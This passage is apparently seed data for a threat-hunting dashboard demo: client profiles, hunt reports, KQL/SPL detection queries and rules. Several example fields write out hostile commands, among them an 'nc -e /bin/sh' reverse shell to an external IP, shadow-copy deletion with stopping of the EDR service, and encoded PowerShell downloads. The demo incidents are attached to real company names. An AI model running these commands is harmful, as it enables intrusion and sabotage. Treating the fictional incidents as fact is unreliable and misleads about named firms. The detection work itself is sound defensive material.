import { ClientOrg, HuntReport, TodayHunt, User, DetectionRule, SectorThreatIntel } from '../types';

export const INITIAL_USERS: User[] = [
  {
    id: 'user-1',
    name: 'Sarah Lin',
    email: 'sarah.lin@blindspot-threats.io',
    role: 'analyst',
    orgId: 'org-blindspot',
    avatar: 'SL',
    huntCount: 42,
  },
  {
    id: 'user-2',
    name: 'Marcus Vance',
    email: 'marcus.vance@blindspot-threats.io',
    role: 'lead',
    orgId: 'org-blindspot',
    avatar: 'MV',
    huntCount: 68,
  },
  {
    id: 'user-3',
    name: 'Elena Rostova',
    email: 'elena.rostova@blindspot-threats.io',
    role: 'admin',
    orgId: 'org-blindspot',
    avatar: 'ER',
    huntCount: 51,
  },
];

export const INITIAL_CLIENTS: ClientOrg[] = [
  {
    id: 'client-apex-health',
    name: 'GSK',
    industry: 'healthcare',
    logoSlug: 'gsk',
    description: 'Demo profile: global healthcare and biopharma environment with clinical research sites, PACS lab imaging and EHR integrations.',
    primaryTelemetry: [
      'EDR - CrowdStrike Falcon',
      'Windows Event 4688 / Sysmon 1',
      'DNS Query Logs',
      'Firewall / NetFlow Telemetry',
      'Identity Broker Logs (Okta, Entra)',
      'Zeek / Suricata Network NIDS'
    ],
    threatProfile: {
      primaryAdversaries: ['FIN12', 'BlackCat / ALPHV', 'LockBit 3.0', 'Hive'],
      topTargetedAssets: ['EPIC EHR Database', 'PACS DICOM Servers', 'Active Directory Domain Controllers'],
      complianceFrameworks: ['HIPAA Security Rule', 'HITECH', 'NIST CSF v2.0'],
      riskTolerance: 'Low',
    },
  },
  {
    id: 'client-vanguard-fin',
    name: 'HSBC',
    industry: 'finance',
    logoSlug: 'hsbc',
    description: 'Demo profile: retail and commercial banking environment with SWIFT wire operations, trading desks and executive mailboxes.',
    primaryTelemetry: [
      'EDR - Microsoft Defender for Endpoint',
      'Windows Event 4624/4625 (Logon)',
      'Proxy / Web Gateway Logs',
      'Identity Broker Logs (Okta, Entra)',
      'CloudTrail / Cloud Audit Logs',
      'Active Directory Event 4720/4738'
    ],
    threatProfile: {
      primaryAdversaries: ['Lazarus Group', 'Carbanak', 'Scatter Spider / UNC3944', 'FIN7'],
      topTargetedAssets: ['SWIFT Alliance Gateway', 'Core Banking Ledger', 'Executive VIP Mailboxes'],
      complianceFrameworks: ['PCI-DSS v4.0', 'SOX', 'NYDFS 23 NYCRR 500'],
      riskTolerance: 'Low',
    },
  },
  {
    id: 'client-aegis-defense',
    name: 'Airbus',
    industry: 'defense',
    logoSlug: 'airbus',
    description: 'Demo profile: aerospace and defense engineering environment with avionics design repos, CAD/CAM workstations and ground stations.',
    primaryTelemetry: [
      'EDR - CrowdStrike Falcon',
      'Linux auditd / syslog',
      'Windows Event 4688 / Sysmon 1',
      'Zeek / Suricata Network NIDS',
      'WAF Telemetry',
      'CloudTrail / Cloud Audit Logs'
    ],
    threatProfile: {
      primaryAdversaries: ['APT29 (Cozy Bear)', 'APT41 (Double Dragon)', 'Volt Typhoon', 'Labyrinth Chollima'],
      topTargetedAssets: ['CAD/CAM Avionics Blueprints', 'GitLab Engineering Repos', 'Satellite Ground Stations'],
      complianceFrameworks: ['CMMC Level 2', 'NIST SP 800-171', 'ITAR'],
      riskTolerance: 'Low',
    },
  },
  {
    id: 'client-omni-retail',
    name: 'Target',
    industry: 'retail',
    logoSlug: 'target',
    description: 'Demo profile: national retail environment with in-store POS terminals, e-commerce storefront and loyalty APIs.',
    primaryTelemetry: [
      'EDR - SentinelOne',
      'Proxy / Web Gateway Logs',
      'Windows Event 4688 / Sysmon 1',
      'Firewall / NetFlow Telemetry',
      'WAF Telemetry'
    ],
    threatProfile: {
      primaryAdversaries: ['Magecart Group 8', 'FIN6', 'Akira Ransomware'],
      topTargetedAssets: ['Payment Gateway Tokenizer', 'In-Store POS Terminals', 'Loyalty Rewards API'],
      complianceFrameworks: ['PCI-DSS v4.0', 'CCPA/CPRA'],
      riskTolerance: 'Moderate',
    },
  },
  {
    id: 'client-cloudnova-tech',
    name: 'Atlassian',
    industry: 'technology',
    logoSlug: 'atlassian',
    description: 'Demo profile: multi-tenant SaaS environment running on AWS EKS with Kubernetes workloads and cloud data warehouses.',
    primaryTelemetry: [
      'CloudTrail / Cloud Audit Logs',
      'Linux auditd / syslog',
      'WAF Telemetry',
      'Identity Broker Logs (Okta, Entra)',
      'DNS Query Logs'
    ],
    threatProfile: {
      primaryAdversaries: ['TeamTNT', 'Kinsing', 'UNC3886', 'Storm-0558'],
      topTargetedAssets: ['AWS Root / IAM Roles', 'Kubernetes API Server', 'Customer Data Warehouses (Snowflake)'],
      complianceFrameworks: ['SOC 2 Type II', 'ISO 27001', 'GDPR'],
      riskTolerance: 'Moderate',
    },
  },
];

export const INITIAL_HUNT_REPORTS: HuntReport[] = [
  {
    id: 'hunt-101',
    clientId: 'client-apex-health',
    analystId: 'user-1',
    analystName: 'Sarah Lin',
    weekRange: '2026-W38 (Sep 14 - Sep 20)',
    hypothesisTitle: 'Suspicious LSASS Memory Dump via Native MiniDump API',
    hypothesisDescription: 'Adversaries attempting ransomware lateral spread will invoke comsvcs.dll or create process memory minidumps to harvest local admin credentials for hospital domain takeover.',
    techniqueIds: ['T1003', 'T1003.001'],
    dataSources: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1'],
    queryLanguage: 'KQL',
    queryText: `DeviceProcessEvents\n| where FileName in~ ("rundll32.exe", "procdump.exe")\n| where ProcessCommandLine has_any ("comsvcs.dll", "MiniDump", "#24", "lsass")\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName`,
    outcome: 'True Positive',
    notes: 'Detected unauthorized execution on Radiography Workstation RAD-092. Technician account was compromised via weak password. Procdump blocked and session terminated.',
    iocs: [
      { id: 'ioc-1', type: 'IP', value: '192.168.42.118', notes: 'Source jump host' },
      { id: 'ioc-2', type: 'Hash', value: 'd41d8cd98f00b204e9800998ecf8427e', notes: 'procdump64.exe dropped in C:\\Windows\\Temp' },
      { id: 'ioc-3', type: 'Account', value: 'svc-pacs-viewer', notes: 'Compromised service account' },
    ],
    severityScore: {
      id: 'sev-101',
      huntReportId: 'hunt-101',
      clientId: 'client-apex-health',
      topic: 'LSASS Memory Dump on Radiology Endpoint',
      summary: 'Adversary dumped LSASS credentials on clinical workstation hosting DICOM viewers.',
      query: 'DeviceProcessEvents | where ProcessCommandLine has "MiniDump"',
      factors: {
        businessImpact: 'Critical',
        threatStage: 'Lateral Movement/Credential Access',
        detectionConfidence: 'High',
        exploitability: 'High',
      },
      compositeScore: 88,
      severityLevel: 'Critical',
      factorBreakdown: {
        businessImpactPoints: 30.0,
        threatStagePoints: 20.0,
        detectionConfidencePoints: 21.3,
        exploitabilityPoints: 16.0,
      },
      rationale: 'Clinical workstation with access to EHR database. Attacker obtained elevated memory handle.',
      createdAt: '2026-09-17T14:32:00Z',
    },
    createdAt: '2026-09-17T14:35:00Z',
  },
  {
    id: 'hunt-102',
    clientId: 'client-apex-health',
    analystId: 'user-2',
    analystName: 'Marcus Vance',
    weekRange: '2026-W37 (Sep 07 - Sep 13)',
    hypothesisTitle: 'VSS Shadow Copy Deletion and BCDEDIT Tampering',
    hypothesisDescription: 'Ransomware actors (BlackCat/ALPHV) routinely execute vssadmin and bcdedit to disable Windows boot recovery prior to locking patient databases.',
    techniqueIds: ['T1486', 'T1490'],
    dataSources: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1'],
    queryLanguage: 'KQL',
    queryText: `DeviceProcessEvents\n| where ProcessCommandLine has_any (\n    "vssadmin delete shadows",\n    "wbadmin delete catalog",\n    "bcdedit /set {default} bootstatuspolicy ignoreallfailures",\n    "bcdedit /set {default} recoveryenabled no"\n)\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine`,
    outcome: 'No Result',
    notes: 'No unauthorized volume shadow deletions identified across 1,840 Windows endpoints. Verified backup scripts use VSS writer directly without invoking vssadmin command line.',
    iocs: [],
    createdAt: '2026-09-11T16:20:00Z',
  },
  {
    id: 'hunt-103',
    clientId: 'client-apex-health',
    analystId: 'user-1',
    analystName: 'Sarah Lin',
    weekRange: '2026-W36 (Aug 31 - Sep 06)',
    hypothesisTitle: 'Abuse of Encoded PowerShell for Staged C2 Ingress',
    hypothesisDescription: 'Initial staging scripts invoke hidden, bypass-policy PowerShell instances with base64 encoded strings to fetch remote payloads.',
    techniqueIds: ['T1059', 'T1059.001'],
    dataSources: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1'],
    queryLanguage: 'KQL',
    queryText: `DeviceProcessEvents\n| where FileName in~ ("powershell.exe", "pwsh.exe")\n| where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "downloadstring", "invoke-expression")\n| where InitiatingProcessFileName !in~ ("HealthScriptRunner.exe", "EpicUpdater.exe")\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine`,
    outcome: 'False Positive',
    notes: 'Flagged 14 instances from third-party biomedical lab software using base64 encoded launch arguments for telemetry reporting. Whitelisted legitimate vendor script hash.',
    iocs: [],
    createdAt: '2026-09-04T11:15:00Z',
  },
  {
    id: 'hunt-104',
    clientId: 'client-vanguard-fin',
    analystId: 'user-1',
    analystName: 'Sarah Lin',
    weekRange: '2026-W38 (Sep 14 - Sep 20)',
    hypothesisTitle: 'Okta Session Token Hijacking via SIM-Swap / Man-in-the-Middle',
    hypothesisDescription: 'Threat actors like Scatter Spider (UNC3944) target financial helpdesks and steal valid IdP session tokens to bypass MFA for Wire Transfer approval portals.',
    techniqueIds: ['T1078', 'T1078.004', 'T1566.002'],
    dataSources: ['Identity Broker Logs (Okta, Entra)', 'Proxy / Web Gateway Logs'],
    queryLanguage: 'KQL',
    queryText: `SigninLogs\n| where RiskLevelDuringSignIn in ("high", "medium")\n| extend ClientDevice = tostring(DeviceDetail.operatingSystem)\n| summarize Locations=make_set(Location), IPCount=dcount(IPAddress) by UserPrincipalName, bin(TimeGenerated, 4h)\n| where IPCount > 2`,
    outcome: 'True Positive',
    notes: 'Identified anomalous concurrent sessions for Senior Trader in Singapore and residential IP in California. Helpdesk received fake verification call 2 hours prior. Token revoked.',
    iocs: [
      { id: 'ioc-4', type: 'IP', value: '198.51.100.73', notes: 'Residential proxy node' },
      { id: 'ioc-5', type: 'Account', value: 'd.chen@client.example.com', notes: 'Targeted executive trader' },
    ],
    severityScore: {
      id: 'sev-104',
      huntReportId: 'hunt-104',
      clientId: 'client-vanguard-fin',
      topic: 'Okta Session Hijack - Wire Transfer Approval Role',
      summary: 'Adversary spoofed MFA device and logged into wire authorization console with stolen session cookie.',
      query: 'SigninLogs | where RiskLevelDuringSignIn == "high"',
      factors: {
        businessImpact: 'Critical',
        threatStage: 'Initial Access',
        detectionConfidence: 'High',
        exploitability: 'High',
      },
      compositeScore: 78,
      severityLevel: 'High',
      factorBreakdown: {
        businessImpactPoints: 30.0,
        threatStagePoints: 10.0,
        detectionConfidencePoints: 21.3,
        exploitabilityPoints: 16.0,
      },
      rationale: 'Direct potential financial loss prevented. High severity escalation triggered immediate password and session reset.',
      createdAt: '2026-09-18T10:14:00Z',
    },
    createdAt: '2026-09-18T10:20:00Z',
  },
  {
    id: 'hunt-105',
    clientId: 'client-vanguard-fin',
    analystId: 'user-2',
    analystName: 'Marcus Vance',
    weekRange: '2026-W37 (Sep 07 - Sep 13)',
    hypothesisTitle: 'Rclone Cloud Storage Exfiltration to Mega/OneDrive',
    hypothesisDescription: 'Attackers stage financial spreadsheets and export records using rclone or MEGA sync clients over HTTPS.',
    techniqueIds: ['T1567', 'T1567.002'],
    dataSources: ['Proxy / Web Gateway Logs', 'EDR - Microsoft Defender for Endpoint'],
    queryLanguage: 'KQL',
    queryText: `DeviceProcessEvents\n| where FileName in~ ("rclone.exe", "megasync.exe", "filezilla.exe")\n    or ProcessCommandLine has_any ("mega.nz", "box.com", "transfer.sh")\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine`,
    outcome: 'Needs Follow-up',
    notes: 'Detected portable WinSCP utility executed by contractor on settlement server. Verifying if data transfer was authorized under ticket #CHG-8911.',
    iocs: [
      { id: 'ioc-6', type: 'Process', value: 'C:\\Users\\ext-contractor\\Downloads\\winscp.exe', notes: 'Non-standard SFTP client' },
    ],
    createdAt: '2026-09-09T15:40:00Z',
  },
  {
    id: 'hunt-106',
    clientId: 'client-aegis-defense',
    analystId: 'user-3',
    analystName: 'Elena Rostova',
    weekRange: '2026-W38 (Sep 14 - Sep 20)',
    hypothesisTitle: 'DLL Side-Loading via Legitimate Microsoft Signed Binaries',
    hypothesisDescription: 'APT29 leverages signed Windows binaries (e.g., calc.exe, odbcconf.exe, certutil.exe) to execute unvetted payload DLLs placed in working directories.',
    techniqueIds: ['T1055', 'T1574.002'],
    dataSources: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1'],
    queryLanguage: 'KQL',
    queryText: `DeviceImageLoadEvents\n| where FileName !in~ ("kernel32.dll", "ntdll.dll", "user32.dll")\n| where InitiatingProcessFileName in~ ("calc.exe", "odbcconf.exe", "certutil.exe", "curl.exe")\n| where FolderPath !startswith "C:\\\\Windows\\\\System32"\n| project TimeGenerated, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine`,
    outcome: 'True Positive',
    notes: 'Found mock odbcconf.exe sideloading malicious dbnetlib.dll inside C:\\ProgramData\\Diagnostics. Implant communicated with external C2 IP in Bulgaria.',
    iocs: [
      { id: 'ioc-7', type: 'IP', value: '185.220.101.45', notes: 'APT C2 Listener' },
      { id: 'ioc-8', type: 'Hash', value: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', notes: 'dbnetlib.dll malicious payload' },
      { id: 'ioc-9', type: 'Registry', value: 'HKCU\\Software\\Classes\\CLSID\\{F86FA3AB-70D4-4B26-896B-01B4B69A3B5A}', notes: 'COM hijack persistence' }
    ],
    severityScore: {
      id: 'sev-106',
      huntReportId: 'hunt-106',
      clientId: 'client-aegis-defense',
      topic: 'State-Sponsored DLL Sideloading on Avionics Simulation Node',
      summary: 'APT actor executed DLL sideloading bypass on airframe CFD modeling cluster.',
      query: 'DeviceImageLoadEvents | where FolderPath !startswith "C:\\Windows\\System32"',
      factors: {
        businessImpact: 'Critical',
        threatStage: 'Execution/Persistence',
        detectionConfidence: 'Critical',
        exploitability: 'Critical',
      },
      compositeScore: 95,
      severityLevel: 'Critical',
      factorBreakdown: {
        businessImpactPoints: 30.0,
        threatStagePoints: 15.0,
        detectionConfidencePoints: 25.0,
        exploitabilityPoints: 20.0,
      },
      rationale: 'Targeted nation-state cyber espionage on defense engineering network. Active C2 beaconing confirmed.',
      createdAt: '2026-09-19T08:12:00Z',
    },
    createdAt: '2026-09-19T08:25:00Z',
  },
  {
    id: 'hunt-107',
    clientId: 'client-omni-retail',
    analystId: 'user-1',
    analystName: 'Sarah Lin',
    weekRange: '2026-W37 (Sep 07 - Sep 13)',
    hypothesisTitle: 'Memory Scraping of Point-of-Sale Payment Gateways',
    hypothesisDescription: 'POS malware scans virtual memory addresses of POS.exe processes looking for Track 1/Track 2 card numbers prior to tokenization.',
    techniqueIds: ['T1005', 'T1055'],
    dataSources: ['EDR - SentinelOne', 'Windows Event 4688 / Sysmon 1'],
    queryLanguage: 'KQL',
    queryText: `ProcessAccessEvents\n| where TargetProcessFileName in~ ("RetailCheckout.exe", "POSHost.exe")\n| where DesiredAccess in ("0x10", "0x1410", "0x1F0FFF")\n| project TimeGenerated, SourceProcessFileName, TargetProcessFileName, SourceProcessCommandLine`,
    outcome: 'No Result',
    notes: 'Scanned 450 store checkout terminals. No suspicious OpenProcess handles with memory read privileges detected.',
    iocs: [],
    createdAt: '2026-09-10T14:10:00Z',
  },
  {
    id: 'hunt-108',
    clientId: 'client-cloudnova-tech',
    analystId: 'user-2',
    analystName: 'Marcus Vance',
    weekRange: '2026-W38 (Sep 14 - Sep 20)',
    hypothesisTitle: 'AWS Metadata IMDSv1 SSRF Abuse and IAM Role Credential Harvesting',
    hypothesisDescription: 'Adversaries exploiting public web applications query 169.254.169.254 to pull temporary AWS security credentials assigned to EC2 worker nodes.',
    techniqueIds: ['T1190', 'T1078.004'],
    dataSources: ['CloudTrail / Cloud Audit Logs', 'WAF Telemetry'],
    queryLanguage: 'SPL',
    queryText: `index=cloudtrail eventName=AssumeRoleWithWebIdentity OR eventName=GetSessionToken\n| search requestParameters.roleArn="*WorkerNodeRole*"\n| stats count, values(sourceIPAddress) by userIdentity.principalId\n| where count > 50`,
    outcome: 'True Positive',
    notes: 'SSRF vulnerability in PDF report generator service exploited to query IMDS. AWS WAF rule patched and enforced IMDSv2 hop-limit=1 immediately.',
    iocs: [
      { id: 'ioc-10', type: 'IP', value: '45.154.255.89', notes: 'Adversary scanner targeting /export-pdf' }
    ],
    severityScore: {
      id: 'sev-108',
      huntReportId: 'hunt-108',
      clientId: 'client-cloudnova-tech',
      topic: 'AWS IMDSv1 Credential Theft via Web App SSRF',
      summary: 'Public web endpoint coerced into querying local metadata API to steal node IAM token.',
      query: 'index=cloudtrail eventName=AssumeRole',
      factors: {
        businessImpact: 'High',
        threatStage: 'Initial Access',
        detectionConfidence: 'High',
        exploitability: 'High',
      },
      compositeScore: 75,
      severityLevel: 'High',
      factorBreakdown: {
        businessImpactPoints: 22.5,
        threatStagePoints: 10.0,
        detectionConfidencePoints: 21.3,
        exploitabilityPoints: 16.0,
      },
      rationale: 'SSRF allowed unauthorized AWS API key generation. Remediation to IMDSv2 prevents recurrence.',
      createdAt: '2026-09-16T18:22:00Z',
    },
    createdAt: '2026-09-16T18:40:00Z',
  }
];

export const INITIAL_TODAYS_HUNTS: TodayHunt[] = [
  {
    id: 'th-1',
    clientId: 'client-apex-health',
    source: 'CVE / CISA KEV',
    sourceReference: 'CVE-2026-21890 (Epic EHR & PACS Gateway Auth Bypass / Remote Code Execution)',
    priority: 'Critical',
    hypothesisName: 'CVE-2026-21890: Unauthenticated DICOM PACS Gateway Traversal Spawning Web Shells',
    techniques: [
      { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' },
      { id: 'T1505.003', name: 'Web Shell', tactic: 'Persistence' },
      { id: 'T1059.001', name: 'PowerShell Execution', tactic: 'Execution' },
    ],
    dataSourcesRequired: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1', 'WAF Telemetry'],
    summaryAndRationale: 'Q3 2026 CISA KEV alert warns of automated, opportunistic exploitation of healthcare PACS imaging gateways where unauthenticated crafted HTTP multipart requests drop obfuscated .aspx web shells in clinical portal roots to stage patient records.',
    suggestedQuery: {
      language: 'KQL',
      code: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("w3wp.exe", "pacs_router.exe", "dicom_srv.exe", "tomcat.exe")
| where FileName in~ ("powershell.exe", "cmd.exe", "pwsh.exe", "rundll32.exe")
| where ProcessCommandLine has_any ("-enc", "DownloadString", "Invoke-Expression", "WebClient", "net user", "whoami")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine`
    },
    expectedBaseline: 'PACS imaging endpoints only execute vendor-signed image processing binaries and never invoke command shells or script hosts.',
    truePositiveExample: 'pacs_router.exe spawned powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA... staging clinical directories into %TEMP%\\dcm_cache.zip.',
    aiHuntScore: {
      threatRelevance: 98,
      telemetryAvailable: 95,
      detectionGap: 88,
      recentActivity: 94,
      historicalPrevalence: 78,
      priorityScore: 92,
    },
    generatedAt: '2026-09-28T07:15:00Z',
  },
  {
    id: 'th-2',
    clientId: 'client-apex-health',
    source: 'Ransomware',
    sourceReference: 'Qilin & RansomHub 2026 Healthcare Double-Extortion Surge (CISA Advisory AA26-088A)',
    priority: 'Critical',
    hypothesisName: '2026 Ransomware Inhibit Recovery: Volume Shadow Deletion via VSSAdmin & EDR Service Neutralization',
    techniques: [
      { id: 'T1490', name: 'Inhibit System Recovery', tactic: 'Impact' },
      { id: 'T1562.001', name: 'Disable or Modify Tools', tactic: 'Defense Evasion' },
      { id: 'T1003.001', name: 'LSASS Memory Dumping', tactic: 'Credential Access' },
    ],
    dataSourcesRequired: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1', 'Firewall / NetFlow Telemetry'],
    summaryAndRationale: 'Active 2026 healthcare ransomware campaigns employ automated living-off-the-land scripts to batch-unload EDR filter drivers (fltmc unload) and delete volume shadow copies (vssadmin / bcdedit) across clinical servers moments before launching parallel multi-threaded file encryption.',
    suggestedQuery: {
      language: 'KQL',
      code: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("cmd.exe", "powershell.exe", "wscript.exe", "rundll32.exe")
| where (ProcessCommandLine has_any ("vssadmin", "delete shadows", "wbadmin", "bcdedit") and ProcessCommandLine has_any ("ignoreallfailures", "recoveryenabled no", "delete catalog"))
     or (ProcessCommandLine has_any ("fltmc unload", "sc stop", "net stop") and ProcessCommandLine has_any ("csagent", "sentinelone", "windefend", "sophos", "carbonblack"))
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`
    },
    expectedBaseline: 'Legitimate backup software uses Windows VSS APIs internally without calling cmd-line vssadmin or issuing bcdedit ignoreallfailures.',
    truePositiveExample: 'cmd.exe /c "vssadmin.exe delete shadows /all /quiet & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & sc.exe stop csagent".',
    aiHuntScore: {
      threatRelevance: 96,
      telemetryAvailable: 90,
      detectionGap: 84,
      recentActivity: 92,
      historicalPrevalence: 82,
      priorityScore: 89,
    },
    generatedAt: '2026-09-28T07:15:00Z',
  },
  {
    id: 'th-3',
    clientId: 'client-vanguard-fin',
    source: 'Threat Actor Intel',
    sourceReference: '2026 Scattered Spider & Muddled Libra: Rogue FIDO2 Key Registration & Session Replay',
    priority: 'Critical',
    hypothesisName: 'Identity Abuse 2026: Fast-Follow Helpdesk MFA Token Reset & Anomalous Session Pivot',
    techniques: [
      { id: 'T1098.001', name: 'Additional Cloud Credentials / Rogue FIDO2', tactic: 'Persistence' },
      { id: 'T1078.004', name: 'Cloud Management Accounts', tactic: 'Initial Access' },
      { id: 'T1621', name: 'MFA Fatigue / Push Flooding', tactic: 'Credential Access' },
    ],
    dataSourcesRequired: ['Identity Broker Logs (Okta, Entra)', 'Windows Event 4624/4625 (Logon)', 'CloudTrail / Cloud Audit Logs'],
    summaryAndRationale: 'Threat groups in 2026 target financial institutions via helpdesk voice-phishing (vishing) and AI voice synthesis to reset authenticators, enroll rogue FIDO2 hardware tokens, and hijack Azure/AWS administrator roles.',
    suggestedQuery: {
      language: 'SPL',
      code: `index=okta eventType IN ("user.account.reset_password", "user.mfa.factor.activate", "user.session.start")
| transaction actor.alternateId maxspan=30m
| where match(client.geographicalContext.country, "(?i)(unknown|russia|nigeria|romania)") OR client.userAgent LIKE "%HeadlessChrome%"
| table _time, actor.alternateId, eventType, client.ipAddress, client.userAgent, target.displayName`
    },
    expectedBaseline: 'MFA device enrollment is restricted to corporate IP ranges during working hours with explicit IT change ticket approval.',
    truePositiveExample: 'Helpdesk account approved user.mfa.factor.activate for wire operator, followed 3 minutes later by session from bulletproof VPN host 185.220.x.x.',
    aiHuntScore: {
      threatRelevance: 97,
      telemetryAvailable: 100,
      detectionGap: 85,
      recentActivity: 95,
      historicalPrevalence: 88,
      priorityScore: 93,
    },
    generatedAt: '2026-09-28T07:15:00Z',
  },
  {
    id: 'th-4',
    clientId: 'client-aegis-defense',
    source: 'CVE / CISA KEV',
    sourceReference: 'CVE-2026-30418 (Cisco ASA & Ivanti Connect Secure Zero-Day Perimeter Traversal)',
    priority: 'Critical',
    hypothesisName: 'CVE-2026-30418: Zero-Day Edge Appliance Memory Injection & Reverse Shell Beaconing',
    techniques: [
      { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'Initial Access' },
      { id: 'T1059.004', name: 'Unix Shell', tactic: 'Execution' },
      { id: 'T1071.001', name: 'Web Protocols C2 Beaconing', tactic: 'Command and Control' },
    ],
    dataSourcesRequired: ['EDR - CrowdStrike Falcon', 'Linux auditd / syslog', 'Zeek / Suricata Network NIDS'],
    summaryAndRationale: 'State-sponsored threat actors in 2026 actively weaponize zero-day memory corruption in perimeter appliances to establish in-memory reverse shells without writing files to disk, bypassing perimeter boundary filters.',
    suggestedQuery: {
      language: 'SPL',
      code: `index=defense_linux sourcetype="auditd"
| where match(exe, "(?i)(/bin/sh|/bin/bash|/usr/bin/python|/usr/bin/perl)") AND match(ppid_exe, "(?i)(webvpn|vpnserver|nginx|apache2)")
| stats count, values(cmdline) as commands by host, ppid_exe, exe, _time
| table _time, host, ppid_exe, exe, commands`
    },
    expectedBaseline: 'Perimeter gateway daemons run strictly in chrooted environments and never spawn interactive shell interpreters or outbound network sockets.',
    truePositiveExample: 'Parent process webvpn spawned /bin/sh -c "nc -e /bin/sh 194.26.29.112 443" connecting outbound from defense perimeter subnet.',
    aiHuntScore: {
      threatRelevance: 99,
      telemetryAvailable: 95,
      detectionGap: 92,
      recentActivity: 98,
      historicalPrevalence: 75,
      priorityScore: 94,
    },
    generatedAt: '2026-09-28T07:15:00Z',
  },
  {
    id: 'th-5',
    clientId: 'client-omni-retail',
    source: 'Malware',
    sourceReference: '2026 Magecart & Akira Retail Supply Chain Infiltration Campaign',
    priority: 'High',
    hypothesisName: '2026 POS In-Memory Scrape: PowerShell DLL Reflection & Encrypted Webhook Exfiltration',
    techniques: [
      { id: 'T1055.001', name: 'DLL Process Injection', tactic: 'Defense Evasion' },
      { id: 'T1056.001', name: 'Keylogging / Memory Scraping', tactic: 'Collection' },
      { id: 'T1567.002', name: 'Exfiltration to Cloud Storage', tactic: 'Exfiltration' },
    ],
    dataSourcesRequired: ['EDR - SentinelOne', 'Proxy / Web Gateway Logs', 'Windows Event 4688 / Sysmon 1'],
    summaryAndRationale: 'Adversaries compromise third-party retail maintenance jumpboxes to inject memory scrapers into POS terminal processes (pos_engine.exe) and stage payment token dumps to cloud storage services.',
    suggestedQuery: {
      language: 'KQL',
      code: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("powershell.exe", "cmd.exe", "rundll32.exe")
| where ProcessCommandLine has_any ("pos_engine", "pos_terminal", "credit_card", "Track2", "VirtualAllocEx", "WriteProcessMemory")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine`
    },
    expectedBaseline: 'POS terminal processes only communicate with localized internal payment broker gateways over TLS with pinned certs.',
    truePositiveExample: 'Unsigned powershell.exe injected remote thread into pos_engine.exe followed by outbound HTTPS POST to discordapp.com webhook.',
    aiHuntScore: {
      threatRelevance: 91,
      telemetryAvailable: 90,
      detectionGap: 80,
      recentActivity: 88,
      historicalPrevalence: 82,
      priorityScore: 86,
    },
    generatedAt: '2026-09-28T07:15:00Z',
  },
  {
    id: 'th-6',
    clientId: 'client-aegis-defense',
    source: 'Coverage Gap',
    sourceReference: 'ATT&CK Gap Engine 2026: T1071.004 Covert DNS Tunneling & C2 Beaconing',
    priority: 'High',
    hypothesisName: '2026 Covert DNS Tunneling for Exfiltration & Command Channel',
    techniques: [
      { id: 'T1071.004', name: 'DNS Application Layer Protocol', tactic: 'Command and Control' },
      { id: 'T1048', name: 'Exfiltration Over Alternative Protocol', tactic: 'Exfiltration' },
    ],
    dataSourcesRequired: ['DNS Query Logs', 'Zeek / Suricata Network NIDS'],
    summaryAndRationale: 'This defense client has not executed a DNS tunnel or high-entropy subdomain hunt in over 180 days despite possessing full Zeek dns.log telemetry.',
    suggestedQuery: {
      language: 'SPL',
      code: `index=zeek sourcetype="zeek:dns"
| eval query_len = len(query)
| where query_len > 40
| stats count, dc(query) as unique_subdomains, avg(query_len) as avg_len by id.orig_h, domain
| where unique_subdomains > 40 AND avg_len > 35`
    },
    expectedBaseline: 'Legitimate internal DNS queries to internal zones have predictable subdomains and low character entropy.',
    truePositiveExample: 'Repeated TXT/NULL queries with base32 encoded strings exceeding 60 characters to ns1.stealth-c2.top.',
    aiHuntScore: {
      threatRelevance: 88,
      telemetryAvailable: 100,
      detectionGap: 95,
      recentActivity: 95,
      historicalPrevalence: 70,
      priorityScore: 90,
    },
    generatedAt: '2026-09-28T07:15:00Z',
  }
];

export const INITIAL_DETECTION_RULES: DetectionRule[] = [
  {
    id: 'det-rule-001',
    clientId: 'client-apex-health',
    huntReportId: 'rep-1',
    huntHypothesisTitle: 'LSASS Memory Dumping via Comsvcs & Native MiniDump',
    ruleName: 'EDR-PROD-LSASS-DUMP-COMSVCS-WINWORD',
    description: 'Alerts when comsvcs.dll or rundll32 creates a minidump of the Local Security Authority Subsystem Service (LSASS) process.',
    platform: 'Microsoft Sentinel (KQL)',
    severity: 'Critical',
    status: 'Production Active',
    techniqueIds: ['T1003.001'],
    tactics: ['Credential Access'],
    queryLogic: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("cmd.exe", "powershell.exe", "rundll32.exe", "wmiprvse.exe")
| where ProcessCommandLine has_any ("comsvcs.dll", "MiniDump", "MiniDumpWriteDump", "lsass")
| where ProcessCommandLine matches regex @"MiniDump\\s+[0-9]+\\s+.*\\.dmp" or ProcessCommandLine has "lsass"
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine, ReportId`,
    targetDataSources: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1'],
    targetEnvironment: 'Azure Sentinel Prod (Workspace: ws-secops-01)',
    deployedBy: 'Sarah Lin',
    sentDate: '2026-09-18T14:30:00Z',
    approvedDate: '2026-09-19T09:15:00Z',
    lastTriggeredDate: '2026-09-24T18:22:10Z',
